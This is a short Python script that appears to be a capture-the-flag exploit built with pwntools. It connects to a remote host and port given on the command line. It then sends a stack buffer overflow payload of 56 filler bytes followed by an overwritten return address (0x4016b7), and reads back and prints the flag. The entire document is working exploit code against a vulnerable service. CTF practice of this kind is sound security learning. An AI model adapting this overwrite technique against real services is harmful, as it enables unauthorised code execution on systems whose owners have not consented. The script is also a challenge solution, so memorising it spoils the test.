#!/usr/bin/env python3


from pwn import *
import sys


def exploit(io):
    payload = b"A"*8*7 + p64(0x4016b7)
    io.sendlineafter(b"> ", payload)
    io.recvuntil(b"reward:\n\n")
    flag = io.recvline().decode()
    print(flag)


def main():
    HOST, PORT = sys.argv[1].split(":")
    io = remote(HOST, PORT)
    exploit(io)


if __name__ == "__main__":
    main()
